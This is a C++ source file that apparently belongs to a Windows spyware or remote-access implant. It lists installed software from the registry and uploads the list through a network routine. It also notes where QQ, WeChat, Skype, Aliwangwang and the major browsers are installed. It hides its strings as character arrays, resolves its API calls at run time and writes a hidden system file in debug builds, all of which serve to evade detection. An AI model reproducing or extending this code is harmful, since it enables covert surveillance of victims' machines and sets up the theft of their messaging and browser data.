
#include "../api.h"
#include "../public.h"
#include <Windows.h>
#include <lm.h>
#include <Winternl.h>
#include "../network/NetWorkdata.h"
#include "InstallApps.h"
#include <iostream>

#include <string>
#include <unordered_map>
#include "../StrHelper.h"
#include "../log.h"
#include "../StrHelper.h"

using namespace std;

//1 json
//2 iocp
//3 encrypt
//4

CRITICAL_SECTION gcsAppList = { 0 };

unordered_map <string, SoftInfo> gUninstallMap;


int GetApplicationInfo(int noSend) {
	int iRet = 0;

	if (gcsAppList.SpinCount == 0 && gcsAppList.LockCount == 0)
	{
		InitializeCriticalSection(&gcsAppList);
	}

	int cnt64 = 0;
	if (iCpuBits == 64)
	{
		cnt64 = getInstallList(64);
	}

	int cnt32 = getInstallList(32);



	if (noSend == FALSE)
	{
		Json::FastWriter fastwriter;


		Json::Value info;

		Json::Value lists;

		unordered_map <string, SoftInfo>::iterator it;
		for (it = gUninstallMap.begin(); it != gUninstallMap.end(); it++)
		{
			info["name"] = it->second.m_strSoftName;
			info["ver"] = it->second.m_strSoftVersion;
			info["install"] = it->second.m_strInstallLocation;
			info["publisher"] = it->second.m_strPublisher;
			info["date"] = it->second.m_strInstallDate;
			info["uninstall"] = it->second.m_strUninstallPth;

			lists.append(info);
		}

		//string infojson = fastwriter.write(lists);

		string infojson = lists.toStyledString();

		iRet = uploadData((char*)infojson.c_str(), infojson.length(), INSTALLED_APPS, 0);

#ifdef _DEBUG
		char strFilePath[MAX_PATH] = { 0 };
		iRet = makeFullFileName(strFilePath, INSTALLAPPS_FILENAME);
		HANDLE hFile = lpCreateFileA(strFilePath, GENERIC_WRITE | GENERIC_READ, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			writeLog("GetMachineInfo lpCreateFileA error\r\n");
			return FALSE;
		}

		DWORD dwCnt = 0;
		iRet = lpWriteFile(hFile, (char*)infojson.c_str(), infojson.length(), &dwCnt, 0);
		lpCloseHandle(hFile);
#endif
	}

	return cnt64 + cnt32;
}



int getInstallList(int cpubits)
{
	char lpSubKey[MAX_PATH] = { 'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\',\
		'C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','U','n','i','n','s','t','a','l','l','\\',0 };

	char strDisplayName[] = { 'D','i','s','p','l','a','y','N','a','m','e',0 };
	char strDisplayVersion[] = { 'D','i','s','p','l','a','y','V','e','r','s','i','o','n',0 };
	char strInstallLoc[] = { 'I','n','s','t','a','l','l','L','o','c','a','t','i','o','n',0 };
	char strPublisher[] = { 'P','u','b','l','i','s','h','e','r',0 };
	char strInstallDate[] = { 'I','n','s','t','a','l','l','D','a','t','e',0 };
	char strUninstall[] = { 'U','n','i','n','s','t','a','l','l','S','t','r','i','n','g',0 };

	char szSkypeName[] = { 'S','k','y','p','e',0 };
	unsigned char szQQGBK[] = { (unsigned char)0xcc,(unsigned char)0xda,(unsigned char)0xd1,(unsigned char)0xb6,'Q','Q',0 };			//"ÌÚÑ¶QQ"
	char szIEName[] = { 'I','n','t','e','r','n','e','t',' ','E','x','p','l','o','r','e','r',0 };
	char szFireFoxName[] = { 'M','o','z','i','l','l','a',' ','F','i','r','e','f','o','x',0 };
	char szChromeName[] = { 'G','o','o','g','l','e',' ','C','h','r','o','m','e',0 };
	unsigned char szWechatGBK[] = { 0x0ce,0x0a2,0x0d0,0x0c5,0 };
	unsigned char szWangwangGBK[] = { (unsigned char)0xb0,(unsigned char)0xa2,(unsigned char)0xc0,(unsigned char)0xef,
		(unsigned char)0xcd,(unsigned char)0xfa,(unsigned char)0xcd,(unsigned char)0xfa,0 };

	EnterCriticalSection(&gcsAppList);

	DWORD dwType = KEY_READ;

	PVOID dwWow64Value = 0;
	//HKEY_LOCAL_MACHINE and 64 bits must use like this
	if (cpubits == 64)
	{
		dwType |= KEY_WOW64_64KEY;
		pfnWow64DisableWow64FsRedirection(&dwWow64Value);
	}

	int counter = 0;

	HKEY hkResult = 0;
	//DWORD dwDisPos = 0;
	//LONG lReturn = lpRegCreateKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, REG_NONE, REG_OPTION_NON_VOLATILE, dwType, 0, &hkResult, &dwDisPos);
	LONG lReturn = lpRegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, dwType, &hkResult);
	if (lReturn == ERROR_SUCCESS)
	{
		DWORD index = 0;

		SoftInfo softinfo = { 0 };

		char szKeyName[MAX_PATH] = { 0 };
		DWORD dwKeyLen = MAX_PATH;
		int iRet = lpRegEnumKeyExA(hkResult, index, szKeyName, &dwKeyLen, 0, NULL, NULL, NULL);
		while (ERROR_NO_MORE_ITEMS != iRet && ERROR_SUCCESS == iRet)
		{
			index++;
			if (*szKeyName)
			{
				char strMidReg[MAX_PATH];
				lplstrcpyA(strMidReg, lpSubKey);
				lplstrcatA(strMidReg, szKeyName);
				HKEY hkRKey = 0;
				if (lpRegOpenKeyExA(HKEY_LOCAL_MACHINE, strMidReg, 0, dwType, &hkRKey) == ERROR_SUCCESS)
				{
					DWORD subtype;
					*softinfo.m_strSoftName = 0;

					DWORD dwNameLen = MAX_PATH;
					lReturn = lpRegQueryValueExA(hkRKey, strDisplayName, 0, &subtype, (LPBYTE)softinfo.m_strSoftName, &dwNameLen);

					dwNameLen = MAX_PATH;
					lReturn = lpRegQueryValueExA(hkRKey, strDisplayVersion, 0, &subtype, (LPBYTE)softinfo.m_strSoftVersion, &dwNameLen);

					dwNameLen = MAX_PATH;
					lReturn = lpRegQueryValueExA(hkRKey, strInstallLoc, 0, &subtype, (LPBYTE)softinfo.m_strInstallLocation, &dwNameLen);

					dwNameLen = MAX_PATH;
					lReturn = lpRegQueryValueExA(hkRKey, strPublisher, 0, &subtype, (LPBYTE)softinfo.m_strPublisher, &dwNameLen);

					dwNameLen = MAX_PATH;
					lReturn = lpRegQueryValueExA(hkRKey, strInstallDate, 0, &subtype, (LPBYTE)softinfo.m_strInstallDate, &dwNameLen);

					dwNameLen = MAX_PATH;
					lReturn = lpRegQueryValueExA(hkRKey, strUninstall, 0, &subtype, (LPBYTE)softinfo.m_strUninstallPth, &dwNameLen);

					lpRegCloseKey(hkRKey);

					if (*softinfo.m_strSoftName)
					{
						if (*strQQPath == 0 && lplstrcmpiA(softinfo.m_strSoftName, (char*)szQQGBK) == 0)
						{
							lplstrcpyA(strQQPath, softinfo.m_strInstallLocation);
							bQQExist = TRUE;
						}
						else if (*szIEPath == 0 && strstr(softinfo.m_strSoftName, szIEName))
						{
							lplstrcpyA(szIEPath, softinfo.m_strInstallLocation);
						}
						else if (*szFireFoxPath == 0 && strstr(softinfo.m_strSoftName, szFireFoxName))
						{
							lplstrcpyA(szFireFoxPath, softinfo.m_strInstallLocation);
						}
						else if (*szChromePath == 0 && strstr(softinfo.m_strSoftName, szChromeName))
						{
							lplstrcpyA(szChromePath, softinfo.m_strInstallLocation);
						}
						else if (*szWechatPath == 0 && strstr(softinfo.m_strSoftName, (char*)szWechatGBK))
						{
							lplstrcpyA(szWechatPath, softinfo.m_strInstallLocation);
							bWechatExist = TRUE;
						}
						else if (*szSkypePath == 0 && strstr(softinfo.m_strSoftName, szSkypeName))
						{
							lplstrcpyA(szSkypePath, softinfo.m_strInstallLocation);
							bSkypeExist = TRUE;
						}
						else if (*szAliwangwangPath == 0 && strstr(softinfo.m_strSoftName, (char*)szWangwangGBK))
						{
							bAliwangwangExist = TRUE;
							lplstrcpyA(szAliwangwangPath, softinfo.m_strInstallLocation);
						}

						unordered_map<string, SoftInfo>::iterator it = gUninstallMap.find(softinfo.m_strSoftName);
						if (it == gUninstallMap.end())
						{
							gUninstallMap.insert(pair<string, SoftInfo>(string(softinfo.m_strSoftName), softinfo));
						}

						counter++;
					}
				}
				else {
					iRet = GetLastError();
				}
			}

			dwKeyLen = MAX_PATH;
			*szKeyName = 0;
			iRet = lpRegEnumKeyExA(hkResult, index, szKeyName, &dwKeyLen, 0, NULL, NULL, NULL);
		}
		lpRegCloseKey(hkResult);
	}

	if (cpubits == 64)
	{
		pfnWow64RevertWow64FsRedirection(&dwWow64Value);
	}

	LeaveCriticalSection(&gcsAppList);

	return counter;
}
